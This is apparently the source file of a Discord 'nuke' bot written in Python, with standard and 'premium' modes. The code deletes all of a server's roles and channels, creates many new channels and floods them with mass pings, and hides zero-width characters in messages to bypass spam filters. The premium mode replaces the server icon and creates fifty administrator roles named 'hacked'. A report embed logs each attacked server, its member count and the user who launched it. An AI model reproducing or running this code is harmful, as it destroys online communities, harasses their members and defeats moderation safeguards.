import discord
import asyncio
import aiohttp
import random
from datetime import datetime

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ STEALTH ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_clean_text(text):
    """Invisible obfuscation for bypass."""
    chars = ["\u200b", "\u200c", "\u200d"]
    return f"{text}{''.join(random.choices(chars, k=3))}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ EXECUTION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def start_nuke(ctx, bot, name, text, channels_count, pings_count, premium, log_id, icon_url):
    guild = ctx.guild
    
    # Parallel destruction
    tasks = [
        *(role.delete() for role in guild.roles if not role.is_default() and not role.managed),
        *(channel.delete() for channel in guild.channels)
    ]
    
    if premium:
        tasks.append(premium_tasks(guild, icon_url))
        
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Parallel creation and spam
    pings_per_channel = pings_count // channels_count if channels_count > 0 else 0
    remaining = pings_count % channels_count if channels_count > 0 else 0
    
    for i in range(channels_count):
        extra = 1 if i < remaining else 0
        asyncio.create_task(create_channel(guild, name, text, i, pings_per_channel + extra, premium))
        await asyncio.sleep(0.01)
    
    await send_report(ctx, bot, premium, guild.member_count, channels_count, pings_count, log_id)

async def create_channel(guild, name, text, index, amount, premium):
    try:
        channel = await guild.create_text_channel(f"{name}-{index+1}")
        asyncio.create_task(spam_messages(channel, text, amount, premium))
    except: pass

async def spam_messages(channel, text, amount, premium):
    for _ in range(amount):
        try:
            final_text = get_clean_text(text) if premium else text
            await channel.send(final_text)
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(e.retry_after if hasattr(e, 'retry_after') else 1.0)
            else: break
        except: break

async def premium_tasks(guild, icon_url):
    tasks = [update_icon(guild, icon_url), create_roles(guild)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def update_icon(guild, url):
    try:
        async with aiohttp.ClientSession() as session, session.get(url) as resp:
            if resp.status == 200: await guild.edit(icon=await resp.read())
    except: pass

async def create_roles(guild):
    tasks = [guild.create_role(name=f"hacked-{i}", permissions=discord.Permissions(administrator=True)) for i in range(50)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def send_report(ctx, bot, premium, members, channels, pings, log_id):
    log_channel = bot.get_channel(log_id)
    if not log_channel: return
    
    type_str = "PREMIUM" if premium else "STANDARD / ESTANDAR"
    embed = discord.Embed(title="REPORT / REPORTE", color=0x2b2d31, timestamp=datetime.utcnow())
    embed.add_field(name="Server / Servidor", value=f"**{ctx.guild.name}**\n`({ctx.guild.id})`", inline=True)
    embed.add_field(name="User / Usuario", value=f"{ctx.author.mention}", inline=True)
    embed.add_field(name="Type / Tipo", value=f"`{type_str}`", inline=True)
    
    stats = f"```\nMembers:  {members}\nChannels: {channels}\nPings:    {pings}\n```"
    embed.add_field(name="Stats / Estadisticas", value=stats, inline=False)
    
    if ctx.guild.icon: embed.set_thumbnail(url=ctx.guild.icon.url)
    
    try: await log_channel.send(embed=embed)
    except: pass
